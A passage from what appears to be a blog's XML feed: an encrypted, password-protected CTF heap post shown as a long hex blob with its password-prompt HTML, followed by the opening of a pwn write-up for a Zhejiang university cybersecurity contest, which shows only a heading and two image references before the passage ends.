044056f4d0d61de96d1fe5a39447302d3c554cd4b11305aaa6d5cb8bd72333e468fa9ad90fa5813befceaa3663462e4cfa40201d97c5f83898232a825585aea63802f990b5cfee7599bf48020365a1b7fe929a04506abf54c181ea8afd13ee639528ed90745a3c6ed66e23b8417742bdbe140946f223e6c0e3abbcda14ba5af01b15e4b7e0cd19a15752e30d17ba5d2f272dd7654102fba9c1af662eaad0e7739c6095af09d4e85468bab706f6f6cf2db399d85007f7bfecd0e9e12bc11d1a9dac348564328c889427ca2228ff08168d02f6d1a5df6cf11e5409147a69586651173a88275db06b1170cc072c276cb87c506e65fda4487c8201c9e0996ed00309a5aa801c3d386f7233945972e3e8c355521c8a7c45689b8e414848c94f5fc5c6a8d14e4c99a4efd4fa705e55c7374eb0bb9cf854be8e6d3b13c0cc10cb4760cf78be473abdf27ee896ab1055daef7360042907b43e866e3467491705c7661ff58d6b264480ccf7bbd68701fefc0e9753565b4594fa945a082f2b46ff20863d6da569990c19845b4c254f00cd07a387ecffa29bd16ce04a48cf4de55d2679bbd6f155391d971f831c66393e120c4d2dbf52f1cb733e4a39772be76a87ddcf66441c1af51f8a0232e8e4125a3ba709b006b67d76c59034e9b0780c9fe20ec59ecdaf34db51e15f4e47cfc522fc6c419f848412de595f096ecfaa6363c4850a19754f822086f206c334910e9f1ad6bf79a6f8d74e42e3be6f0e01a58898c778611289a39742362085b9019664b350ec9d8159ea6df779b28657918675ed942ca4dc237ea6e449015376396ea2a3af6ad67a57953b4ed0d60dc6a05e49291a1297e9353b044c85ea1ffb48144467402b7d95597b9458ecfd8dc9203e18ab94904dff582ee8f70c2ac5c1d56de6b7b1be93a1359ad29fa1cfe0d2b21332a308edee4b0ca641f04728e5b9fca9e64d317f238c84d2b618e89a800562ef766a89fb318541940d1ce5990c6d70d587178edc5ccd251d3fccaa9e5447c7a6d4be5ba2bacabb8aee6315ce7ed43e344322c999a4c207d027d77cc529541a220aecc45039a959c20ed285bbb5a6d358aed57a15e8fa1d64ddfee7a060094f1c3360048d4bac1285e7bdba97e9148765fb7c38176647118df721779fb4572471340d30fbbf5b4977330dae7a4e64fd8e38f12c63e5ed2f2c737aa62ae8862398fb3a2228e0bc6f27fbb92fbb8bd6c9043a6bded7969c14ca8b41221950fd2a1915c9a2e2d8f154c169dfbc129344c2c1f728641863ebf06c3377976045bad2bff1e4e9aefa2e7b540a8aeb08a96877ee979e8e1c7020ced2a0fbbed750df3e01e949549cf116ebd02520aa825a288a604727b92e8d51df824e348f3cb1e75dab8916082370fa43401eba24046757319e0ad6e596922bc9aeccd3bb942375052f50c89d3cf45b659179fc2bdffac0358d184e75d1ba2799ae8f78d4c19c0b2aea5050a81d99641eeabbeda6689febd23d154c47312889ee938e1a1442bea7a425bfb161b25b782b26d23ee69e762a37a26bfd9bd1ccb3e8bd3661da958598abbce4749bccc164b9945ffaaba19cf897aaf2e6c7b6d54f4443fb0e3141b1c4ac1bff19d087736c8898d5e023d1da277e91bcb0e827be30040098a43b61cadc65dc109af997c6418cb8ce509c5a7c98ad4403e7959804425755745ea1ec919d562020d974fc1892adf4a2c9c5466a4eac438f4762199fe5b5aec3ed446fb56c3fae861fc0d04712925824ad544b39b2d2f92bb1997d7f4a6e71b37cf9af3a1e6d1b388fa1c337b9bf1869063cd57d4999ff88994825376f48966ec8fa073d92e6652ea262087db9f290d3766f3090d4b6fb369f0c6026ce5c3a7f9a9335339efbe66681bb27e7bc80f28be885242eb517f9799761c14c5d5f9472ed56658b8ddf02b675a2bf7381c96fb2a06657efd38f5f7dfce0adeaeaccd06f87d1191f2c2b589a65857a9dedfda6b0a9f0665fa80b73f2a05aee2da53fe71dd1227111582a27c3b9bd0ef4226f162608931bd03f7466f3275b674a5c376510ba25031748b1ecffece2e19f7d81d4d02f1481481dec8cb3ae66563f7241a6d337e52f67a9b3a55b0fff9909ea744142002efd8f07e06e38a87da5eadb27bb5313b17185217bbeb8ca1aeb44379897759ffb1487c4a3a9122cb0a31f520e44b923c08cc4bd293628628f1067ba44914b2b23e1058b7e1427eacba16fcf8385a26ddfa6e0c7d6b7a26efdbdf79a3120c29f635fed27920f9cf284b3274711b05b8cd3a4986f2165f5ac22a315715c98676a3c02c55ace1c53e5daf1e1b31c108095f506a1d523501d8a7c8d8e2c8ca799934c8532201ea7495c08dc82063b86f9af3c63e5472909347851c855356780745ab6b6567d86b9f2a2ef9353ff1519445a5bf1fbabb77e96cff9493ba101cb7cb4c9d09773963cc163b1298caa29e60691b47f47921cb8f526dd9a9a2ad9b8547474e0be7e3add5db07d39a0885f5e9609a1e2a4cc1213a025b6670b8739b0c66b26d12a99570b3f79c47183c38acaf0a5aec1b7303222962397ee0ea4847c20e2ae3a9fe1506ef054df5cd696d4f0282a6b09ed67ebc061da13c031fd8ce5f0ce8dc29ed454333efeb38e2e84ac1dd7fb9da4a8a776ee0090da21f5572e14972a4ca0454d50433f9597468f35e8c614f2b746f43a81c8d5eb5a1ab8470b035be6295d0cb2ecbd88edb96619de64c6e84784c3ce25e264d8c156bd0f50befa32dc2d6db44dc6192f998d24ded806c616b3ccdcbe210064608d29ba9383638f7d1ae39b023f0049a853ff5cf9a7990287948721f322092ffb460ad267aa1f2c47ba9f247ddf9d8bce97041f83ca0037ee31a92c6dd7cffeb4ae0d915fd584f65df872d333e95c3f4ce48d4f06c56edd2e611156290e2b5885b7d8384b2fcf0ea4e444c884c71da0a20ea763c39f8847693c877ae1f68a1c7b642df80de9e8739696821f27cbe0d2545321d8c2bd40c95988952eaaaf1962338096c6ab227bb90cd50e4ace1038ec40fb2784eb5f5f74ab4cfdb4d78f07ed92f78c10c615a8972de454115cd1f34e861363c863e31f8f9a9f52a980e3c536a60edf7e2a169e3965ab78b06260f423acc01a4810562dbeaec173417c829665d25e2a56c884eb2fd23b95dee2c1892f36af68fdcf4cce5ebad251c5d41e6ac7c8f9670fc77abfeac8dfbea4cdbe0818b51808ce3811781e7930333eeef3dc243343a99ee03835680d1e6bb36821277582e306bacd78293406af96bfc20daf3395d08d858e67da86789544505f4f4998b331feb6f5e7ebf9f43aa0ccac061ab8c0370fb29948738ef079b77c9a86dd5e1c1129180b09c86d70dec69f23411687532e705a1f0b5fe0a6a47b01cd93c4cbbf4dc1b91ab8ebfbbe5ca961c21b842ead4c16ef6479114eee0afa2a4db05798d543638f5a731285cde8a3c0c87d7291ed8f8bce8608530cb9932d67420202ff070d2577eeb11966bf2ba98f0ca27b11da0940bab3280bdd8753c5e699e0ed48518a3012772470b6baa220bc0761dacdc316185486e6897e6b80cfaa7419d28b6b7203562a02ab1cd058c97c65167f6cae13bf77aeff6bb730f1e3281d44a156e384137660827eb930a295358e575e3677aabda9bffa891301f982fbaa4bfb2da50915609bd1d97f9677cde3fb36ebca9c7d2eaa686bdb44f1ebb1a2b297785053c0f332769c4bffc9ead53356994877f52c0b9a00a9e244c6ff1e8eee9bdb3dd44c95ae2f842b88f15e2c82e7397653768d2d2585e38089318c6ba12845d23170a049f2464cac1258e2e8d33635d9705674cf80ccfa44d8351a4a79ce0506e85690c09ac89d8c5cd5fece1b9e9d66e85307f566ca909595df72120b09b06f99fcaa755c5cc636e491e38c8cb4998ff2a97e9ddb0e59e7f24f9ba50fdc33263b47b95fb45cd9be312d6f2c7b029f29b8a6f8c37a8c76c9414b71628db075a9f6abb6ddd54e19637d960c4674dbdf5aa98a5de95c9f59ef99a200d2920e50062891280aa6b82d0084818fe56189a4acdd88b6441e8563fc5127400b64e43d6007deb9be00f9396fa0e474c2b1c28a36b476185cf6f45c14ee67c16aba13e335e463e22d8b5e0f6ff72b4eb148fc813a6d2eaafc1109a7b03ab6efb0f3a7acd71f4f6279d875fe56751c0f4e55c67113e1a95230513659b781e1076f6016b35093b2c9dc8c6c5ba9f6e885e4fed63b1f17226beb502fd1bb55710f0faf8b3ea088657b92516fadd2d19edcb67c694851583d91bd420ddf26da31129d257a118c1da3411405726d64c1650ab1e1cd0369e4df971ffd086889e7c77a46a827d1c90a393971270653a5acccc3cf8daa473ee229b6e3978f2fa7b6b168b5e5d3034bfc1c32da46f8d2d20e662b4414e620dac5e628088fde48a58779148506a76242bcc6563741a032bf233b8a697850518fdc3db15e4c8dc8c44ae9080db816bf2af87cf1f4f631c68ff0524e75038395b8c9d88cb01e8503ccd4fc2dd98ce6f92eabf5474f68ce6777ac8d40f829461617fa44d564e6b6aa5d34a72257af36430f95b757885e62505ee51e0d673101e1b74c5143c0ba5fd71969cecf859e8a2ea280db8ce45bf0a1b107c7a2b60b0c888ffcd6e6e23dc2f7ad9cbac326b4d593444ae33c9ba673dd42a2179a217bf008226f664768a8fe6cbc8de6a16a7fe3b98872d725499e08e9142f224019eaed1344e1eecc58daa2513342497bfea8ba4d7ee132e230d05619c3e6ce01647ce9b1dd840fc0a9023bcfe842a5237eb74739628e32a71f70e78dc3e9db49c7978f2ac6913a4dd6f55e0bac3832f5d73175cf7575098095a497df0b03b6672523de305712ac1b63a8513f28d1f798fd5a8818c6b25f94af98fce9f9c7ed0366f51a98d8f1601bbd289c0bb1ee84e5e941fa1cb3028c7fe2fbce139a8b7eddd882db0fe327711dcff966d0f9ba4e8dbaef5727204732003803a28293303072fe1c90ef96d9cce62f7facd6f53c291fd54c3dc1e183eabab48a46bd1d63121e570ba81d53df44e3d8325954bb76e4826096e74844154644712a615df5da6289b69b90837fda8bebc169e6f119ae53f41b7c0b01f4532987849e0fb97622dbe7d9fac58b5f8baf266865bff8529c5fa336f1361a4051fdf07ade9e64bec469ff336ad1bf2a8cd0efc0e9f34a185038700e3e19de1533777042eb99946285e145a5a5325687dc3891bb0375f3af458b97fc11d029f395fb470dca1e2c14bac1a5fb92f9b77811701fbe638e3cc3577a9ca64507fb6a54bdbc0d34506676616c75f3b3332be9c08ee9ad6228da40c359e730a1c0c324b4b57ada80baeb556278d13f9fd5cd87a08492841f025cf21517e30bacde0ab35562087efa9cd7fbd3ddb99c669dc64c47752381623fc804b17e36bd52925d62338bc95eb7578ce6d4248e416aa95aad45450f8cbba556c516c3dc629f7e34308fbe614adfd6e6b30126450cdb245da9789a35f593318d27c39b376172398b63049bd70f988f411f0c22407127231cce1d10978a87a34abcd55db766213e27c52539c9cddc1dc51798ec08665308d71eac87747953846c45dcb6c262bf26da93f0957cac2ea1f11012dc293ddc260f3fde2ad8c20680fb22f82a421d345171ad7ab2289b0db65467129d8bcfd3ee121025488950839ac140d50e789908d758cfdf143785e9124ad5c054f9d8e5ace92ebb28571b5c355a757d1837d669280eb2a684bcef5b70d15b50e82d93484239ed8c494482dfbb664872efff0dd5731a2b2df5bbd1e98c6465541c6b89d3678a58b109300feb304e49cc43c852aaad5c2074d4bec3be3e14fc362ad25cfbba424c8cb5eba4c9051df81db3f355922cad8db9c3a4fc6badea2916782118822f25fedea6aa8ecba2c112eddfe5f826f662e0879b39a63b3457a8b0b79cc40206d3847ea08ef6b4023d26922aff4dd425bd08f41c4be2ed6f86b2808f85fc08025405f5855dddfaae6708447eb813ca95932557e89632ae7613d6311a183c3c57780798f8700939bb2d2bf59835931e2baf4aea3d0ba33597e231ee052dc55e0b6a853642127fa09a6fd1e630eeecc72c7ce02dcf0b69ed826a4c8c2e9cdaf7469e3ee77e3c68c944916084b26d65f49025c6a3e4b762d6d4692361131f6a93b00a1be28cf360b8fa530fbb7e06d458720a52e614bf5f3d288bd67bc0198646f1600484811e5b212c8989e90afd88a9b305df603d53ccbed5353579bd4c42dd77eba78f57c5c04ed56099d772765c9a23543a4bcbbef7f124e468e464983d5801bc24958d05fac36212ea5b4ab1ef101e7316c550576a2b0f35cf4b26f0c8da9e02b379081f42de6cab357f256fae41ce5ce6ac9803c0a406404f7a57c9023b943318b8cca445999aca7e691dcd1caaa75edda8e95f52b825af0b1783726f2850ca48a985aa0e4aa9bb0dd09001f7bdcc34c3c115e8aa902e25742c907502c03dff9f19f053053f0ab6e3dfa1ed0346fec6ee5afdade83ae5e79a616096ea315e26543198fd03e8e4a8706537fba805121b5a432c76eb3d3e99cd31dcef7c4c17fc9a6a20010a9af1e521947ba7e69511f11b1f5ab3fc5d035cbdd39347a0b8f086f4b318741355a8b0748eb16f4497e2b99b1ee8a01079f959c8e7b9e02f5302fd2ec2881f527c5d849ac2c2c2bc65dfe4508ad2123f71bf04a9597ce1ad8c4808993abbfac03f85d8f351b0c3d62a0e256b44ae8c35db6a679f3f25070bc787f6e148f63a7ed60345efd5f706dd54888d42587bfcebe2be48c898a4aff4ed9f7841ba3afed2f73d12c6fc717c83bd4bb2e704f3b4caad9f9bbece7a951d93f3b525ab0bbf97e98cd2b69d98b1d52245a8307b93467a80daf30911374da77496cdc858b47d9cc7d6d39f4ed5c0db8060b15a69f99fac01d4cb217370983313c57b4bb3710bc37c25573a31c31817d3dc15a27f5241840cf6ab63d34bbd209592de6c1250fd33a995397832f4ec9421294f50bc37914ccf020a70dda81685c5c66b5f7c7688041528a3461f99efd2d4d39c2433f854eabd85bd4861bd4f66e020a75cf3f54c83da818a61d278a1617261d5c9e9d86288b6834ba85c5e5fab6e0e5ab511a499a87b6dea2ac923191c3fd4011e0f1e5f8b1254a6b58ee4d7ee03c1a09ceb8b6a961ae4d080c6292a818d4a05ff6b9920de514b2c3bf0857f016060ac7ccca28157445f8993bd711db6c0dbdd64490ceb3fbac363bb41864a710955a3781b62878de7df78be65a29cb539e29ac7946243cf2953e69f61a85c26062eb4011ae8f75db45473c272e4492287b55119ce27d6fa7afded83e7582bb49bb271cdc99d2d44b1a01da07bebdea1390dbadf5d6557e438fd0c9476d07efc807166bfa7c3db65b20ed70cf255b023b27601953f7d3bc6b1784447fc545c645d0c195ef6cf67a181265dc92c25ea94be264f226f47d771e56296112e3c144cd3fc219914895056f5931df93c5651473f98249da87a59dc484ce8dbcfd328b16d2520443697de583171aece3326321f1ab5aec66a593769c4d010d8d0d548908e9ded6dc7a2413860dd9577db569f4db22dece9b724cdb4a308f26b70575b019bb76e8b9296f75581702473609c518d4d50d7e5be64c94bdb5bc702fd3dd2c0481fb920737c78b2d31444306a73c2364cb2bb96f26b1993642da8fd65cb417cc19ad2d7af9e413c0b25498fe446fb7e01a34736636e85a077c33ac46b6e0c386bb90b8bbc3f016d09f9c27f80cfa89f81e703aa33332cbbd0ce2863160c28df6d90eebfc2e38801c56c8a6605d468fbb7d7d80fa06af031ae9a33da61c30472f58edd732eda517e3438f5be19e8932955ded6c6bb81eb27f0ef81b4f5a441833f625cc64ebf6f1f8515642179ff727347de96a94fc161d4cf02779a9f5fb9521aaef155075a3a578cb3839e7f673e9b66e0a62a067951e91acb514cf901c2700d061d91d1fcadfadf1bf0abe85eee45c770621a11f96710db06fe7e4f1bf3ee274a72e9f5457a5e4f0895451e1a3b9b839bb8c9954384b049b5fe51b26b3ef2c9f2e189448784060280d6d0eb735f485b4049bd9fde12f7e7d9e88a865c0603de0abdf2445757dd4e01bbaee7bf82ed4f0b4a7ef726a77954a4988de25316f2acea9a36adf0d2bda6fe2b1236311263fffc35b9f36e8e8416f5c964da82f52d369c7753e93bc3faf14d06d14c662676cbcf226f2943f7d1a1bb041a21727007beebe0e9d3e74b979f69a4ca6f7db763c2567f3027d18b2f16fbc9124a7e121c5e060aa76d1166de1c94ebe6a6eefa9767c80b64f116e26107c727a4c0a569ede0f1fb441a0c1fdcc172ea7f283f3143f9a90dec91f7c55db1629a1acb802aaa6bb7cc16acdf183e6d756c4d7cfa4da04ea2c69d0a78879ebd508ce08124ee2b579ae557eb656133b4abb66ee2ed6048b5987a036dbd6a08959ce5e92cb7315a76602a59ea2725e81a12ff07bcfeae49e22e875ce2400eacfb74e08386d4de36605a0ae9c173e1b539a3b010c86ac26399951f74fbff19577506332f57aca4fc374e2e400ad8feab8313a607dae4001804cac6f5132f33b5e08f07278be0353867a3b56ea4925740f7e2bb92edb1e50771118a1da331d965aa7a53ddf7e54891d5974a9c79a0748a556146b09d4769ed48f86fd26fdc6eabb0654f5b6a7ec52bd3358e6e237bcb919baf340fe2b4a3a829ad70b937b6b2733ab6d0722e1f59b6ca7c31ec5766bad36ff2e7df927fb45d963b2e660ff2b642664cd556b25c61bd35304602920430fb7a2c17e8e3a17fda5d4809bd29dc658b204bc49ef2d702b5dca7fbbc05fc7298b9422ee9c0d0c649a8822a9ee21db852c2523876dd703334157d5c1aa86a2f497dd347cf58c1f634bdde5e299210c80da880051f9b33b2f7304b58225139ea43fea159f983ec8e6f2c0df622dd3547e634498e1292cc78a368e51cbf2be0d4e88e803d235814582f050ea4212382df8a37d062dee01db43290ad740a8d344a74e4d2f67826e7573229d6becfb2a099a32687be1b24559a6411e88839b3579b3846ba7d7aeeeef45da2ad6cc99fd231959ae75b76d617dd8db8938872a591a7c74a1eae55925c5f5a2215c1f793bc7d243f38afd24bd5bd68cbc65b45ed74ae4c7d6b33729edfb088fec86fdc32a986f7dfc38f71971305225cdf65bd4c62ebfb893f1b64d68147f3c94d2dfddf38f9222adfd57017807a047a75d3ade8efd71579ced21e100ffb41afa8f635aa001827e203d4ec5bb375d7583f734fd9011ff51b2a342dad5c21f22b831d9e1c2832518cd27352f8e47d6096d3839458f203c305319a836bb291ae167625151e248998700428c042f76d283a2f36b67556e3ed9613fbc47fdc21ea50ef00d8445a2c381974769042b97784257358143457ec3c312e675b250ec6aa3b594bb096c54a8c671a3daa5408739e3bdb684473d802adea12ea61c7e8fc9096dedd4c587395a8a4ba60819b00f8945c1e817eaad2dc0a9a3e5e28baddf8675dc47d70acaa8289c919fbbaf85f4a45741537c0024aed45e9461a76e45587d448a3e07a17a309716ac1faaca7b9ed696af6988a52215edad9c06fb5d2067207289f1ea1b7a3f24d4726cfbbdf8abcd17a7c4b5a6f4294162a1b493bab280573abcb4cdb9913bbbf4f9d496c726141c907a7c44862944acca1520c5f9cd1b92d97733d9a8254ebcfad5cbf79afe77db5e5f40b4304248253f81a7a3fd0aa69b1b320d82b4e011b08e4bd5772cc84c4f956e9527131b2a95b7eabeca43eb6eb066dfb7bd620d074a23f3cf1ecb91c6e297ce295bed67b359081cf4265a82ff6ee5e55a3271a5186ba786f4091d781f87e787412ef223ff85d97ae94c939e0f51fe93aa13ab3a2684ebd9564952cd1e7b22ea1a32a634c708d17ea244361ece33ecf967fe7bf4cc384c209a3a3f32ff1f5efbf15e7d803b5818e6de332053cb7c37e7743fdc38e15153e1d7ab89587794e84557e6dc0a9a4794445dedfb3a4a78955a123991036af60fbc08d2c4800ea2d2376694adb685ac3c203a14594d4002bd0831abbc2c651e98cfde11908130564137b0c67f37c9f70972368d307e82afbf0b3b248b05b84d108e23374bbe18771b6945ba407a39b38b84be3b0bf1d05c5eda80c62f8fab1a7ddeb639b01046c38bf9a5622d45911ab32a9621ab902ee46d79c2aee6d146ece069effa3e3f30202c31af8b41fa03cddc1870c30f9cf2b259e24189ed6e74708ea6552becf41b41676ceb6f78845c521044dfd950075490492cd15cf9ba1da87d4ea259ba29c3b58fd67d33d17e95aa54430d27796a6485ab9e2fb6541b84d7c676626ef716624fedd0ea8f1d2551a57ca8dfc9a5e06c450868e882ae0f067da2287d1108d1aca1efabc15dda7ae20b87911241573f96a278f82ea63a7899c56a33fa73db6635565bb234553dd2d943aa67216264ee701cc57b8451f05440e3c27f75a083a1da843b152d157725bbcb6e799db213a482e1d42f1cbf6f9eb69eaa368b8d26763dfbd762d1114b0cb28951a159c4356c83eab961636d2e9e9230ae07e43c006658e3a551fb86cfe4322a57c8d6cb1f181b2e999f14f20f4f4bcfb76ff5cb761b3b19e0b8d7f9b61029764f188829502a6da84fbdf555a3edee3a13de0f5f10e7761843f7b6580fbc54ac08c5c67405b10657233df13c4751cf0a02bbdd505dce9d754e3ee1fe4f6b132b8857b385854dba70b27eb7670ddd18a0fcacaf63d09e579845a5ee477b29638241ae72b09c5d194a145ffc9a29bd169182215784a2af5ea5f3144907f9dfa95016ee089b1cb92e54343ab83c820ac46a6cd20b1e10bf02e503aaa9fc9be84e5f4202de9655c6970afb05ddeba389bf349013edaeb9e7a8f19cb75730b6a2629793633d2cb969d05ef455d86dca67c095dee06f93892cb5bb7ba68908a64abf1e1571dde28029864dc273ea4226be96ae05d743260531f54908b768847d444ca15a4eeb471f8e0b8f60d9c37e306c0aff732bf0a19cdc40ae0d7f3cf3dc51c7bc0ee94ea74d82a9bdd9d99e0e81d9b9b69bea0a4580167c14b20041b12fb3777389a7ae4ba5f47b7250fbb33fa85e34e482fd94c00ea1bfe29700963f552d105809eb55239de6a3ea708161186d4c53b5214dbef3ad97fcef0ea8d2469306b50e7ebcd15258572714e2ed2d894f35ce491c235010f35efe798fb741f3a8d59b4ac70d37173b5a851f927966f197208a2bdd19b6db6c813946fa7f34a840db13d8d9a07668cfc08a61b1dbe31e512b04d151ee62797f4a5611de638ff0a070a7c04f4adbfb6c83bd0812758db3728b9da30573499adde9e70b31f5ce78da65c201abd52c248f009ffff38611298972cc6d1aacdaa13f4cdf5f0077bc03c8a141f4a157b742ca6090d66457812ac14b33f617f86ce2e6493c92ef6828b04832220e1e3f7a0c6d329094e9a061f185a74756115bf7a4e7a1a2bd1a8e8f9709d75393d2182ea84093277846ceafdf7e8cb74f4ed4c901a07f1f63c132fac564206a2e82c8f8757c92a51fd91f433dc2ef4d819bb276f8dd8eac0683c81eec00454443cfc9b8513fa6763c22d6f0fd742262dab27c77abb92b51b1156f9f0689795a4d42d2431ec06aa52b5e202fea9242486b83e8902889d5ab81cfa5b3f4ff2f0a22b115ea4688344873e27ba8efc4101889f7259d8fca9b0ef9bbd42304000fff11baee3ed60c30d9fa6f7ad8f4fc079dfeae74de3eb204595bde16b02018dc77754cefdb0c940899d8987b28a190d28a0be56e53a55c52981c7232cc16c913c9efcad9a8c1f3970191d143cc307b97182a25f6912fc821b5c4920fb7d00b66f1fcfdd2435e64310539d701b4583a4569a23037bbefb80c7b72c811a7fccc438c7819883f86ac2fd10a5af5e6359b346c42423a5208705898e92a889cc873dbd7307e3eda7621eb76720b89346e339fa2a179bf7692a96819451ac790928bfcf2bd3618b47277868fc685099aeb1d7dc5e7675e6b2328bfd83329e6195d693a84523079a5fd1131f322ee8ae7d5ba30d2ad16bab43a3481e6426d819072cec173502801a58475f8ebb0e4571a9365b34eeddf7be2f66a9eb9bcae2de415351e3b47bf4b8caea018eba0857a4241a44fa0d796b8ffb04498df06703461097392d402a0a06464f19fa523b28a33f84d6eb64f169c8a682c409efacceaccb0697ecd0de7009271b85449e2861752a77a9d90311441b6e14dd515c774e6029e253c7d1451cca10d5afaa81d20b040f1e1b6d4c1dc2aaba09e922250b16e788908fa8e109a0caee1049c53c9a6075175924af3a5dc5d588affff007b56f4a47a4c46a9d2af29e288236580e58d58c1c49b65e8212f9e5a19e68e5ebcbecd46763a8d01201102793f931b8fc4d950d5d95f018660a012dcc009d3e87bf019f403dcd0e47a942f85ff3ccc3708c8f3bf3e281f9c7bb2073772eb5db1cccb6f1f973d2b53df3f667564fd9f1a0b402e330dcef374b163efa949dd86f80a9d8a8374e949c1771e3a4716f79e0073fe3ddd390bd70317af516bfa02245539ee7547d295446f5c714e1db95f2eaaa6ccfe05bc4fcf62c6abfa1d52512f6fba9afc636db83cb70b8984a9ae81d90b34fabc57f923975c7fba81deeb72c21690ecbafb37e27c00d4e63569b0ff7fcd3b651d8d8897fb419d4e30f825f8add07e06d903941e629d303755c0c3c16f71a6e75e0cd6d12f27d708fcdc1014ccd96413ae975251abef61823533af7a45ef8ea392f07185a842f491853128e63df942b68bd1c9ec041ca0524caed43978abccfbadafc7b9ed141a75c6db834ba9806a49a5cdf1e4f2575a13681087239c3b5db8799773c5f1dcb746b3813fb32239caed8ffc9f581272b8bf5444679a7e1d7c012c8dc2a5041314d54477977cf158a7892185178f3f2a3fa4f9b0bb47131eed75eba6bd3515493702ed1dc3bad3fc99e40345ae3302d24adab70262c338133b7b7edc3cbe9ad2c689cd2d1c1d831e13131fb4f4efed65f055fa9c5b8924983f2fa22d4dd8315f7f90fdc97b51a83d11165ff0e9c7745d3c0c160a929f51592a7f972c1acd5c1f2faf238d161d124a793949b6c5ca1bde94b39807389fdc39ded322075786560b2d56dca5f0aad2cb2218b7c6cfad7770c939efb27a0b52a162dd4c642ab27922f6ee84ddc6b029b15e9d89aedee8e32bb5e87560af04207b9ff1c7e0ccb71fdf5ded82a209b8a6986946056c0dc759c5b717cbb3f2dd51edd3cc11fbd994259847bbc6ac7cc8e19e6159d76b07ddf6f430b57e19f5c8ecbbf6b63aae950798159b0c22eb8ba9c4099c958abc5f4532d3b53f0be126cd9b4a3672c819ceba4af5cdd844a74cec83494912d036d4ef80652e03f5b8e1ebeacdcf69f0a65986df3389fab3b3b84245fb69f5ee7339173634ff69c94435932c56497308d45bcf6561600894c05f1ffa7bc71d229ecfd859e35f13a8d25ac48bbce392cf178061d79225d4fac20dd3d920bf57899ebee89ef4090ddffbffcaebfdc15affb6c252e166fa4995c33a9d6cdd57b3aee7eceb2776601e28a9c616698abc0533ee0318a6d619aa564fb6a81f74ff0634b3394b489c6b278f07b4f68e97755e4bf823305c5fe6856a673af897323817b3f7c0f7484f203fa34d07a1ffeaae200ccab3e6ff22547f50c5e1926c7413702df61a5a589ed8d263e388b771d4b971061d1f4c3e6e39aa78c8a166f9d58556b36971fa87fc388f12ec160d7e4921b8665372f34117a35059a1da7ed2fb83002da2fe57dd659254de8ec7fa7cedd7b17df87713dea3269caae029943ae374b78ba33ec60a741dcfa6ddeb873edd176d6ea466a8c6c1cc485863a567d41ff3f0c83ed3dc0571ed87430e2457ff35cc550b0c71d8d068f6b782bb2c835d2432161e03a76fbb1c7c156d12e48e46b1460bdef599ce1c7cf28d6650f28618a5cd55ed7a26d1e6a5c4840b7e34f5601cf60621eeaa0e393c83cbb6641b7e2d53bd1d9569cd239499f8ecbf5822df1a9ec6f25edb14b81211e93b096bb2c4818f0bb722a4db3a5c95b7d363abfaa15f4a998ad6f6cb2ef97ee22474b3c0647d65a691472624d176814c91f2cee824a24f3bd5dd352bfc615370783c2992aff44873035fe33fa403a4cc039297e2293af872e8c4dd37195ffb647b5597d2048c97c7dfd7ba1bbc9e9c3b27e10cb8353b9192c132fe8e2b02d20c3267d61b11d28fa04bdcdb918a76256d71b316cde8147a258bf097007fd66cf2e6ff24214652663b4c12ecb168242aeac339256dcc02abbdda678f15c0250b07a3f69d84a5ebc5fbd0b512468f5e181d100df41b702356021cf7b2f66549bd77903c63a0cb84fb52b547993d7a528a933251cc0a8a79e20a1d05bcc89f03af56c6e4a7f123f8d29458188e11c3c59dcad536aec5f1614e0c3f7ab8402c1c4a6c452d9bdbbef2266402cc1d73d521866eb9e88250af5c67b5f2b884fcb6221c303adc4e9d6abe3f60c610dd38119658e166cc3f9bcbf28355fdafb69fe60d094a5568cd96d21de184f3bbc8a0cf6b82f0da005cda2a92352b40b34bd83413773480ff3875175f655d97d7eb2fbdd5fb77cd2ecd8218fb5445abce40921325f7aed70c85dca4ffa367a7b36b2c7d3ae8f2fd3f34dbc67d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第五届大学生浙江省网络安全大赛预赛-pwn</title>
    <link href="/page/wp/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn/"/>
    <url>/page/wp/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="new-stack">new_stack</h2><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-new_stack.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-new_stack-1.jpg" srcset="/img/loading.gif" lazyload alt="后门函数代码" 